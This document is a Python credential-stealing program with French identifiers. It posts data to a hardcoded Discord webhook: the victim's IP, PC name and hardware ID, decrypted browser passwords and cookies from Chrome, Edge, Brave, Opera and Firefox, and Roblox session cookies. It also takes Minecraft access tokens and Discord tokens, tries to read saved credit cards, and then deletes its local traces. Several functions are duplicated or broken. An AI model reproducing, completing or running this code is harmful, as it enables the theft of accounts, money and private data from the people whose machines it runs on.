import requests, os,ntpath,re, sqlite3,json,sys,win32crypt,pyfiglet
from shutil import copy2
from base64 import b64decode
from win32crypt import CryptUnprotectData
from subprocess import PIPE, Popen
from pyfiglet import Figlet
from tempfile import mkdtemp, gettempdir
from Crypto.Cipher import AES
nom_utilisateur = os.getlogin()
nom_pc = os.getenv("COMPUTERNAME")

def ascii_art(fonts, text):

  custom_fig = Figlet(font=fonts)
  return custom_fig.renderText(text)




def initialize():
  global notrewebhook
  notrewebhook = "https://discord.com/api/webhooks/1076973673430392923/uW-bL85WiJFHeg-E27ad6nm0gewCUuD1PkBsP1ZeEroODUL2ceYqFNPT0cBdNbpBA-4W"
  try:
    pc_info()
  except:
    pass
  try:
    password_nav()
  except:
    pass
  try:
    tken()
  except:
    pass
  try:
    minecraft()
  except:
    pass
  
  try:
    cookie_stl()
  except:
    pass
  
  try:
    os.remove(f"./cookie_{nom_utilisateur}.txt")
  except:
    pass
  try:
    os.remove(f"./pswd_{nom_utilisateur}.txt")
  except:
    pass
  
  
def pc_info():
  global notrewebhook
  p = Popen("wmic csproduct get uuid", shell=True,
                  stdin=PIPE, stdout=PIPE, stderr=PIPE)
  hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
  info = f"IP Publiiccc(acking): {requests.get('http://ipinfo.io/json').json()['ip']}\nPC name: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('UserName')}\nHWID: {hwid}"
  embed = {
      "description": f"Information PC:```{info}```",
      "title": f":white_check_mark: - `New Client: *{nom_utilisateur}*`"
  }
  result = requests.post(notrewebhook, json={"embeds": [embed]})


def laclestpbg_chrome(path) -> str:
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            nice_value = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
            return nice_value
        except KeyError:
            return None

def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}\nException: {e}"'
def cookie_stl():
  global list_cookie, robloxcookies, notrewebhook
  list_cookie = []
  robloxcookies = []
  cookie_firefox()
  grabCookies()
  list_cookie.extend(robloxcookies)
  lc = "".join(list_cookie)
  robloxcookies = "\n".join(robloxcookies)

  if len(robloxcookies) < 4:
    robloxembed = {
      "description": f"```no roblox avaible``` :(",
      "title": f":red_car:  - `roblox from *{nom_utilisateur}*`"
    }
  else:
    robloxembed = {
      "description": f"roblox:\n {robloxcookies}```",
      "title": f":red_car:  - `roblox from *{nom_utilisateur}*`"
    }

  result = requests.post(notrewebhook, json={"embeds": [robloxembed]} )
  embed = {
      "description": f"cooooki3 steeeelllzaaadd:\n {lc}```",
      "title": f":cook: - `ckie from *{nom_utilisateur}*`"
  }
  
  result = requests.post(notrewebhook, json={"embeds": [embed]} )
  if str(result.status_code) != "204":
    f = open(f"cookie_{nom_utilisateur}.txt", "w+")
    f.write(lc)
    f.close()
    nembed = {
      "description": f"cooooki3 steeeelllzaaadd:\n (file with)```",
      "title": f":cook: - `ckie from *{nom_utilisateur}*`"
    }
    files = {
      'file': (f'./cookie_{nom_utilisateur}.txt', open(f'./cookie_{nom_utilisateur}.txt', 'rb')),
    }
    r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)
  else:
    pass

  
  
  

  #print("COOOKUIIIIEI")
  
def password_nav():
  global list_pass, notrewebhook
  list_pass = []
  pswd_chrome()
  pswd_other()
  #pswd_firefox()
  lp = "\n".join(list_pass)
  embed = {
      "description": f"pswwrd steeeelllzaaadd:\n{lp}```",
      "title": f":flushed: - `psxd of *{nom_utilisateur}*`"
  }
  result = requests.post(notrewebhook, json={"embeds": [embed]})
  if str(result.status_code) != "204":
    f = open(f"pswd_{nom_utilisateur}.txt", "w+")
    f.write(lp)
    f.close()
    nembed = {
      "description": f"pwdddddd steeeelllzaaadd:\n (file with)```",
      "title": f":flushed: - `pwd from *{nom_utilisateur}*`"
    }
    files = {
      'file': ('./pswd_{nom_utilisateur}.txt', open('./pwd_{nom_utilisateur}.txt', 'rb')),
    }
    r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    global list_pass, list_cookie
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            with sqlite3.connect(LoginData) as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")

            list_pass.append(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
    
                    list_pass.append(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            list_pass.append(f"{name} Login Data file missing\n")
    else:
        list_pass.append(f"{name} Local State file missing\n")

def cookie_decrypt(LocalState, LoginData, CookiesFile, name):
        global list_cookie
            ######################################################################
        if os.path.exists(CookiesFile):
            with sqlite3.connect(CookiesFile) as conn:
                curr = conn.cursor()
                conn.text_factory = lambda b: b.decode(errors = 'ignore')
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            
            list_cookie.append(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    list_cookie.append(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            list_cookie(f"no {name} Cookie file\n")

# PATH SHIT
def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"

def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)

    else:
        list_pass.append(browser + " not installed\n")

def decrypt_files_cookie(path, browser):
    if os.path.exists(path):
        cookie_decrypt(Local_State(path), Login_Data(path), Cookies(path), browser)
        
    else:
        list_pass.append(browser + " not installed\n")

def pswd_other():
  global list_pass
  local = os.getenv('LOCALAPPDATA')
  roaming = os.getenv('APPDATA')
  browser_loc = {
      "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
      "Edge": f"{local}\\Microsoft\\Edge",
      "Opera": f"{roaming}\\Opera Software\\Opera Stable",
      "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
  }
  for name, path in browser_loc.items():
        decrypt_files(path, name)
        

def pswd_chrome():
  global list_pass
  try:
    list_pass.append("**    - CHROME:**```")
    appdata = os.getenv("localappdata")
    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    chrome_regex = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
    chrome_key = laclestpbg_chrome(ntpath.join(chrome, "Local State"))
    for prof in os.listdir(chrome):
      if re.match(chrome_regex, prof):
          login_db = ntpath.join(chrome, prof, 'Login Data')
          conn = sqlite3.connect(login_db)
          cursor = conn.cursor()
          cursor.execute("SELECT action_url, username_value, password_value FROM logins")

          for r in cursor.fetchall():
              url = r[0]
              username = r[1]
              encrypted_password = r[2]
              decrypted_password = decrypt_val(encrypted_password, chrome_key)
              if url != "":
                  list_pass.append(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n==========================")
          cursor.close()
          conn.close()
  except Exception as e:
    pass

def pswd_chrome():
  global list_pass
  try:
    list_pass.append("**    - CHROME:**```")
    appdata = os.getenv("localappdata")
    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    chrome_regex = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
    chrome_key = laclestpbg_chrome(ntpath.join(chrome, "Local State"))
    for prof in os.listdir(chrome):
      if re.match(chrome_regex, prof):
          login_db = ntpath.join(chrome, prof, 'Login Data')
          conn = sqlite3.connect(login_db)
          cursor = conn.cursor()
          cursor.execute("SELECT action_url, username_value, password_value FROM logins")

          for r in cursor.fetchall():
              url = r[0]
              username = r[1]
              encrypted_password = r[2]
              decrypted_password = decrypt_val(encrypted_password, chrome_key)
              if url != "":
                  list_pass.append(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n==========================")
          cursor.close()
          conn.close()



    master_key = laclestpbg_chrome()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            print(
                "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                    expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
  except Exception as e:
    pass

def cookie_firefox():
  global list_cookie

  if sys.platform == "win32" or sys.platform == "cygwin":
      path = os.path.join(os.path.expanduser("~"), "AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
  elif sys.platform == "darwin":
      path = os.path.join(os.path.expanduser("~"), "Library/Application Support/Firefox/Profiles")
  else:
      path = os.path.join(os.path.expanduser("~"), ".mozilla/firefox")
  subfolders = os.listdir(path)
  for subfolder in subfolders:
      cookies_file = os.path.join(os.path.join(path, subfolder), "cookies.sqlite")
      if os.path.isfile(cookies_file):
          break

  conn = sqlite3.connect(cookies_file)
  c = conn.cursor()
  c.execute("SELECT * FROM moz_cookies")
  for result in c.fetchall():
      host = result[4]
      user = result[2]
      if host != "":
        list_cookie.append(f"HOST KEY: {host} | NAME: {user} | VALUE: {result[3]}\n")
      
  conn.close()

def cookie_another():
    global list_pass
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    browser_loc = {
        "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
        "Edge": f"{local}\\Microsoft\\Edge",
        "Opera": f"{roaming}\\Opera Software\\Opera Stable",
        "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
    }
    for name, path in browser_loc.items():
        decrypt_files_cookie(path, name)

def getLocationsMC():
    if os.name == 'nt':
        locations = [
            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
        ]
        return locations
    else:
        locations = [
            f"\\home\\{os.path.split(os.path.expanduser('~'))[-1]}\\.minecraft\\launcher_accounts.json",
            f'\\sdcard\\games\\com.mojang\\',
            f'\\~\\Library\\Application Support\\minecraft'
            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
        ]
        return locations

def minecraft():
  global notrewebhook
  accounts = []
  totalaccount = 0
  numaccount = 0
  for location in getLocationsMC():
        if os.path.exists(location):
            auth_db = json.loads(open(location).read())['accounts']

            for d in auth_db:
                sessionKey = auth_db[d].get('accessToken')
                username = auth_db[d].get('minecraftProfile')['name']
                sessionType = auth_db[d].get('type')
                email = auth_db[d].get('username')
                if sessionKey != None or '':
                    totalaccount = totalaccount + 1
                    accounts.append([username, sessionType, email, sessionKey])
  for account in accounts:
        numaccount = numaccount + 1
        if '@' in account[2]:
            name = 'Email Address'
        else:
            name = 'Xbox Username'
            
        if account[3] == None or " ":
          sessiontype = "NONE(no find)"
        else:
          sessiontype = account[3]


        embed = {
          "title": ":pick: - `account minecraft of *3361*`",
          "fields": [
            {"name": f"{name}","value": f"`{account[2]}`"},
            {"name": "Username","value": f"`{account[0]}`"},
            {"name": "Session Type","value": f"`{account[1]}`"},
            {"name": "Session Authorization","value": f"`{sessiontype}`"}
          ],
          "footer": {"text": f"{numaccount}/{totalaccount}"}
        }
        result = requests.post(notrewebhook, json={"embeds": [embed]})



def grabCookies():
        global robloxcookies, list_cookie
        appdata = os.getenv('LOCALAPPDATA')
        chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
        chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
        chrome_key = laclestpbg_chrome(ntpath.join(chrome_user_data, "Local State"))
        dire = mkdtemp(), gettempdir()
        
        for prof in os.listdir(chrome_user_data):
            if re.match(chrome_reg, prof):
                login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')
                conn = sqlite3.connect(login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = decrypt_val(r[2], chrome_key)
                    if host != "":
                        list_cookie.append(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                        robloxcookies.append(decrypted_cookie)

                cursor.close()
                conn.close()



def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def tken():
    list_tken = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = ""
    for platform, path in paths.items():
          if not os.path.exists(path):
            continue
          tokens = find_tokens(path)
          
          if len(tokens) > 0:
            for token in tokens:
                message = message + f"{platform}: ```{token}```\n" 
          else:
            message = message + f'No tkens found on {platform}.\n' 
      

    embed = {
          "description": message,
          "title": f":coin:` - tkn of  *{nom_utilisateur}*`",
    }
    result = requests.post(notrewebhook, json={"embeds": [embed]}) 
    
    
